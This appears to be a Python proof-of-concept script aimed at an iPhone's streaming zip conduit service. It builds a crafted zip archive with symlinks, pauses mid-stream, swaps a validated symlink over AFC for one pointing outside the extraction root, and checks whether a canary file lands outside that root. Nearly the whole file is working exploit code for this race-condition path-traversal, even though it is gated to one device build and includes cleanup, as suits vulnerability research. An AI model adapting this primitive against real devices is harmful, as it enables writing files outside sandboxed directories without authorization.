#!/usr/bin/env python3
"""Reversible Media-only AFC/SZ symlink-swap composition canary."""

from __future__ import annotations

import argparse
import asyncio
import hashlib
import io
import json
import logging
import plistlib
import re
import secrets
import stat
import struct
import subprocess
import sys
import zipfile
from contextlib import asynccontextmanager, suppress
from typing import Any, AsyncIterator, cast

from pymobiledevice3.bonjour import browse_mobdev2
from pymobiledevice3.lockdown import TcpLockdownClient, create_using_tcp
from pymobiledevice3.pair_records import get_usbmux_pairing_record
from pymobiledevice3.remote import tunnel_service
from pymobiledevice3.remote.remote_service_discovery import RemoteServiceDiscoveryService
from pymobiledevice3.remote.tunnel_service import CoreDeviceTunnelProxy
from pymobiledevice3.remote.userspace_tunnel import UserspaceDialPlane, UserspaceTun
from pymobiledevice3.services.afc import AfcService


EXPECTED_PRODUCT = "iPhone18,2"
EXPECTED_VERSION = "27.0"
EXPECTED_BUILD = "24A435"
SERVICE = "com.apple.streaming_zip_conduit"
CANARY_NAME = "canary-24A435.txt"
CANARY_BYTES = b"codex-streaming-zip-canary-24A435\n"
SZ_EXTRA_ID = 0x5A53  # local-header bytes "SZ"


def redact(value: object) -> str:
    text = str(value)
    text = re.sub(r"\bpid(?:\s*=|\s+)\d+\b", "pid [redacted]", text, flags=re.IGNORECASE)
    text = re.sub(r"\[[0-9A-Fa-f:]+(?:%[^\]]+)?\]", "[redacted-address]", text)
    text = re.sub(r"(?<![\w.])(?:\d{1,3}\.){3}\d{1,3}(?![\w.])", "[redacted-address]", text)
    text = re.sub(
        r"(?<![\w:])(?:[0-9A-Fa-f]{0,4}:){2,}[0-9A-Fa-f]{0,4}(?:%[\w.-]+)?",
        "[redacted-address]",
        text,
    )
    text = re.sub(r"[0-9A-Fa-f]{8}-[0-9A-Fa-f-]{16,}", "[redacted]", text)
    return re.sub(r"[A-Fa-f0-9]{40,}", "[redacted-blob]", text)


def json_safe(value: Any) -> Any:
    if isinstance(value, bytes):
        return {"bytes": len(value), "sha256": hashlib.sha256(value).hexdigest()}
    if isinstance(value, dict):
        return {redact(k): json_safe(v) for k, v in value.items()}
    if isinstance(value, (list, tuple)):
        return [json_safe(v) for v in value]
    if value is None or isinstance(value, (bool, int, float)):
        return value
    return redact(value)


def sz_mode_extra(mode: int) -> bytes:
    return struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 13, 12, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = sz_mode_extra(mode)
    return info


def build_archive(destination: str) -> tuple[bytes, bytes, str, str]:
    # The service first validates this link while it resolves to a real,
    # in-root directory.  The host pauses before the payload local header and
    # replaces only the link itself through AFC.
    link_target = "inside"
    replacement_target = f"../{destination}"
    metadata = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            metadata,
        )
        archive.writestr(zip_info("inside/", stat.S_IFDIR | 0o755), b"")
        # At its original depth this second symlink resolves to the in-root
        # ``destination/`` directory.  If AFC can move the already-validated
        # symlink to ``link``, the unchanged relative text resolves to the
        # fresh sibling directory instead.
        archive.writestr(zip_info(f"{destination}/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("deep/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("link", stat.S_IFLNK | 0o777), link_target.encode())
        archive.writestr(
            zip_info("deep/replacement", stat.S_IFLNK | 0o777),
            replacement_target.encode(),
        )
        # StreamingUnzipService commits an entry when it parses the following
        # local header.  This harmless directory is therefore a look-ahead
        # barrier: it publishes ``link`` while the payload header is still on
        # the host and cannot yet be opened through that link.
        archive.writestr(zip_info("barrier/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(f"link/{CANARY_NAME}", stat.S_IFREG | 0o600),
            CANARY_BYTES,
        )
    blob = output.getvalue()
    with zipfile.ZipFile(io.BytesIO(blob)) as parsed:
        payload = next(item for item in parsed.infolist() if item.filename == f"link/{CANARY_NAME}")
        split = payload.header_offset
    if split <= 0 or split >= len(blob):
        raise RuntimeError("invalid archive split offset")
    return blob[:split], blob[split:], link_target, replacement_target


def paired_coredevice_udid() -> str:
    """Resolve one already-paired local-network target without logging its identity."""
    completed = subprocess.run(
        [
            "xcrun",
            "devicectl",
            "list",
            "devices",
            "--timeout",
            "8",
            "--quiet",
            "--json-output",
            "-",
            "--omit-deprecated-fields-in-json",
        ],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        timeout=12,
    )
    devices = json.loads(completed.stdout)["result"]["devices"]
    matches = []
    for device in devices:
        properties = device.get("properties", {})
        connection = properties.get("connection", {})
        if (
            properties.get("hardware", {}).get("productType") == EXPECTED_PRODUCT
            and connection.get("pairingState") == "paired"
            and connection.get("state") == "connected"
            and connection.get("transportType") == "localNetwork"
        ):
            matches.append(device)
    if len(matches) != 1:
        raise RuntimeError(f"expected one paired local-network {EXPECTED_PRODUCT}, found {len(matches)}")
    udid = matches[0].get("properties", {}).get("hardware", {}).get("udid")
    if not isinstance(udid, str) or not udid:
        raise RuntimeError("CoreDevice inventory omitted the paired target UDID")
    return udid


async def paired_mobdev2_lockdown() -> tuple[TcpLockdownClient, int]:
    """Use Apple's existing pair record to authenticate one mobdev2 address.

    No pairing request is allowed: ``autopair=False`` makes every wrong or stale
    Bonjour address fail closed, while the post-session UDID/build checks select
    the exact CoreDevice inventory entry.
    """
    udid = paired_coredevice_udid()
    pair_record = await get_usbmux_pairing_record(udid)
    if pair_record is None:
        raise RuntimeError("Apple usbmux did not return the existing pair record")

    answers = await browse_mobdev2(timeout=8)
    addresses = list(dict.fromkeys(address.full_ip for answer in answers for address in answer.addresses))
    attempts = 0
    for address in addresses:
        attempts += 1
        try:
            candidate = await create_using_tcp(
                hostname=address,
                identifier=udid,
                autopair=False,
                pair_record=pair_record,
                keep_alive=True,
            )
        except Exception:
            continue
        if (
            candidate.paired
            and candidate.udid == udid
            and candidate.product_type == EXPECTED_PRODUCT
            and candidate.product_version == EXPECTED_VERSION
            and candidate.product_build_version == EXPECTED_BUILD
        ):
            return cast(TcpLockdownClient, candidate), attempts
        await candidate.close()
    raise RuntimeError("no advertised mobdev2 address authenticated as the gated paired target")


@asynccontextmanager
async def wifi_userspace_rsd(result: dict[str, Any]) -> AsyncIterator[RemoteServiceDiscoveryService]:
    """Build RSD over mobdev2 -> CoreDeviceProxy -> the in-process TCP/IP stack."""
    lockdown: TcpLockdownClient | None = None
    proxy: CoreDeviceTunnelProxy | None = None
    previous_userspace_setting = tunnel_service.USE_USERSPACE_TUNNEL
    if previous_userspace_setting:
        raise RuntimeError("a userspace tunnel is already active in this process")
    try:
        lockdown, attempts = await paired_mobdev2_lockdown()
        proxy = await CoreDeviceTunnelProxy.create(lockdown)
        tunnel_service.USE_USERSPACE_TUNNEL = True
        async with proxy.start_tcp_tunnel() as tunnel:
            tun = cast(UserspaceTun, tunnel.client.tun)
            tun.set_peer(tunnel.address)
            async with UserspaceDialPlane(tun, tunnel.address) as dial_plane:
                provider = RemoteServiceDiscoveryService(
                    (tunnel.address, tunnel.port),
                    open_connection=dial_plane.dial,
                    auxiliary_metadata=tunnel.auxiliary_metadata,
                )
                try:
                    await provider.connect()
                    result["transport"] = {
                        "path": "mobdev2 TCP lockdown -> CoreDevice proxy -> in-process userspace tunnel",
                        "existingPairing": True,
                        "autopair": False,
                        "mobdev2AddressesTried": attempts,
                        "inProcessRSD": provider.is_in_process_tunnel,
                    }
                    yield provider
                finally:
                    with suppress(Exception):
                        await provider.close()
    finally:
        tunnel_service.USE_USERSPACE_TUNNEL = previous_userspace_setting
        if proxy is not None:
            with suppress(Exception):
                await proxy.close()
        if lockdown is not None:
            with suppress(Exception):
                await lockdown.close()


async def remove_expected(afc: AfcService, source: str, destination: str) -> list[str]:
    # Exact, non-recursive deletion only. Unlink the escape symlink before
    # touching directories so cleanup can never traverse it.
    ordered = [
        f"{source}/link",
        f"{source}/deep/replacement",
        f"{source}/deep",
        f"{source}/{destination}/{CANARY_NAME}",
        f"{source}/{destination}",
        f"{source}/barrier",
        f"{source}/inside/{CANARY_NAME}",
        f"{source}/inside",
        f"{source}/META-INF/com.apple.ZipMetadata.plist",
        f"{source}/META-INF",
        source,
        f"{destination}/{CANARY_NAME}",
        destination,
    ]
    failures: list[str] = []
    for path in ordered:
        if await afc.exists(path) and not await afc.rm_single(path, force=True):
            failures.append(path)
    return failures


async def run_canary() -> tuple[int, dict[str, Any]]:
    token = secrets.token_hex(6)
    source = f"codex-sz-src-{EXPECTED_BUILD}-{token}"
    destination = f"codex-sz-dst-{EXPECTED_BUILD}-{token}"
    archive_prefix, archive_suffix, link_target, replacement_target = build_archive(destination)
    archive = archive_prefix + archive_suffix
    swapped_link_target = f"../{destination}"
    result: dict[str, Any] = {
        "schema": 1,
        "test": "StreamingZipAFCSymlinkSwapComposition",
        "scope": "/var/mobile/Media only",
        "mobileGestaltTouched": False,
        "source": source,
        "destination": destination,
        "linkTarget": link_target,
        "replacementOriginalPath": "deep/replacement",
        "replacementTarget": replacement_target,
        "swappedLinkTarget": swapped_link_target,
        "prefixBytes": len(archive_prefix),
        "suffixBytes": len(archive_suffix),
        "archiveBytes": len(archive),
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "canarySHA256": hashlib.sha256(CANARY_BYTES).hexdigest(),
    }
    afc: AfcService | None = None
    cleanup_failures: list[str] = []
    cleanup_armed = False
    try:
        async with wifi_userspace_rsd(result) as provider:
            result["device"] = {
                "productType": provider.product_type,
                "productVersion": provider.product_version,
                "build": provider.product_build_version,
                "transport": "CoreDevice userspace localNetwork tunnel",
            }
            if (
                provider.product_type != EXPECTED_PRODUCT
                or provider.product_version != EXPECTED_VERSION
                or provider.product_build_version != EXPECTED_BUILD
            ):
                raise RuntimeError("device/build safety gate rejected the connected target")

            advertised = provider.peer_info.get("Services", {})
            service_name = next(
                (
                    candidate
                    for candidate in (f"{SERVICE}.shim.remote", SERVICE)
                    if candidate in advertised
                ),
                None,
            )
            if service_name is None:
                raise RuntimeError("streaming zip conduit is not advertised by RSD")
            result["serviceName"] = service_name

            async with AfcService(provider) as afc_service:
                afc = afc_service
                try:
                    source_absent = not await afc.exists(source)
                    destination_absent = not await afc.exists(destination)
                    result["preflight"] = {
                        "sourceAbsent": source_absent,
                        "destinationAbsent": destination_absent,
                    }
                    if not source_absent or not destination_absent:
                        raise RuntimeError("fresh-path safety gate failed")

                    cleanup_armed = True
                    await afc.makedirs(destination)
                    connection = await provider.start_lockdown_service(service_name)
                    try:
                        await connection.send_plist({"MediaSubdir": source})
                        await connection.sendall(archive_prefix)

                        # Do not race blindly.  The stream is paused until AFC
                        # proves that the extractor created and validated the
                        # intended in-root symlink and its real target.
                        observed_link: dict[str, Any] | None = None
                        for _ in range(200):
                            if (
                                await afc.exists(f"{source}/link")
                                and await afc.exists(f"{source}/deep/replacement")
                                and await afc.exists(f"{source}/inside")
                                and await afc.exists(f"{source}/{destination}")
                            ):
                                candidate = await afc.stat(f"{source}/link")
                                replacement = await afc.stat(f"{source}/deep/replacement")
                                inside_stat = await afc.stat(f"{source}/inside")
                                if (
                                    candidate.get("st_ifmt") == "S_IFLNK"
                                    and candidate.get("LinkTarget") == link_target
                                    and replacement.get("st_ifmt") == "S_IFLNK"
                                    and replacement.get("LinkTarget") == replacement_target
                                    and inside_stat.get("st_ifmt") == "S_IFDIR"
                                ):
                                    observed_link = {
                                        "link": candidate,
                                        "replacement": replacement,
                                    }
                                    break
                            await asyncio.sleep(0.025)
                        if observed_link is None:
                            raise RuntimeError("extractor did not materialize the paused in-root link")

                        result["pausedState"] = {
                            "linkType": observed_link["link"].get("st_ifmt"),
                            "linkTarget": observed_link["link"].get("LinkTarget"),
                            "replacementType": observed_link["replacement"].get("st_ifmt"),
                            "replacementTarget": observed_link["replacement"].get("LinkTarget"),
                            "insideDirectoryPresent": True,
                        }
                        if not await afc.rm_single(f"{source}/link", force=False):
                            raise RuntimeError("failed to unlink paused in-root link")
                        await afc.rename(f"{source}/deep/replacement", f"{source}/link")
                        swapped_stat = await afc.stat(f"{source}/link")
                        if (
                            swapped_stat.get("st_ifmt") != "S_IFLNK"
                            or swapped_stat.get("LinkTarget") != swapped_link_target
                        ):
                            raise RuntimeError("AFC link swap verification failed")
                        result["swapVerified"] = True

                        await connection.sendall(archive_suffix)
                        try:
                            response = await asyncio.wait_for(connection.recv_plist(), timeout=30)
                            result["serviceResponse"] = json_safe(response)
                        except asyncio.TimeoutError:
                            result["serviceResponse"] = {"timeout": True}
                    finally:
                        await connection.close()

                    target_path = f"{destination}/{CANARY_NAME}"
                    result["phaseObservations"] = {
                        "sourceRootPresent": await afc.exists(source),
                        "metadataDirectoryPresent": await afc.exists(f"{source}/META-INF"),
                        "metadataFilePresent": await afc.exists(
                            f"{source}/META-INF/com.apple.ZipMetadata.plist"
                        ),
                        "linkPresent": await afc.exists(f"{source}/link"),
                        "insideDirectoryPresent": await afc.exists(f"{source}/inside"),
                        "destinationRootPresent": await afc.exists(destination),
                    }
                    result["canaryWrittenOutsideExtractionRoot"] = await afc.exists(target_path)
                    if result["canaryWrittenOutsideExtractionRoot"]:
                        actual = await afc.get_file_contents(target_path)
                        result["canaryContentMatched"] = actual == CANARY_BYTES
                        result["observedCanarySHA256"] = hashlib.sha256(actual).hexdigest()
                    else:
                        result["canaryContentMatched"] = False
                finally:
                    if cleanup_armed:
                        try:
                            cleanup_failures = await remove_expected(afc, source, destination)
                            result["cleanup"] = {
                                "failures": cleanup_failures,
                                "sourceAbsent": not await afc.exists(source),
                                "destinationAbsent": not await afc.exists(destination),
                            }
                        except Exception as cleanup_error:
                            cleanup_failures.append(redact(cleanup_error))
                            result["cleanup"] = {"failures": cleanup_failures}
                    else:
                        result["cleanup"] = {"skipped": "fresh-path gate did not arm cleanup"}
    except Exception as error:
        result["errorType"] = type(error).__name__
        result["error"] = redact(error)
        result.setdefault("cleanup", {})["failures"] = cleanup_failures

    cleanup = result.get("cleanup", {})
    success = bool(
        result.get("canaryWrittenOutsideExtractionRoot")
        and result.get("canaryContentMatched")
        and cleanup.get("sourceAbsent")
        and cleanup.get("destinationAbsent")
        and not cleanup.get("failures")
    )
    result["outcome"] = "confirmed" if success else "not-confirmed"
    return (0 if success else 2), result


def dry_run() -> dict[str, Any]:
    destination = "codex-sz-dst-24A435-dryrun"
    archive_prefix, archive_suffix, link_target, replacement_target = build_archive(destination)
    archive = archive_prefix + archive_suffix
    with zipfile.ZipFile(io.BytesIO(archive)) as parsed:
        entries = [
            {
                "name": item.filename,
                "mode": oct((item.external_attr >> 16) & 0xFFFF),
                "extra": item.extra.hex(),
                "size": item.file_size,
            }
            for item in parsed.infolist()
        ]
    return {
        "schema": 1,
        "dryRun": True,
        "scope": "/var/mobile/Media only",
        "linkTarget": link_target,
        "replacementTarget": replacement_target,
        "swappedLinkTarget": f"../{destination}",
        "prefixBytes": len(archive_prefix),
        "suffixBytes": len(archive_suffix),
        "archiveBytes": len(archive),
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "entries": entries,
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--run", action="store_true", help="run the reversible Wi-Fi device canary")
    args = parser.parse_args()
    logging.disable(logging.CRITICAL)
    if not args.run:
        print(json.dumps(dry_run(), indent=2, sort_keys=True))
        return 0
    code, result = asyncio.run(run_canary())
    print(json.dumps(result, indent=2, sort_keys=True))
    return code


if __name__ == "__main__":
    sys.exit(main())
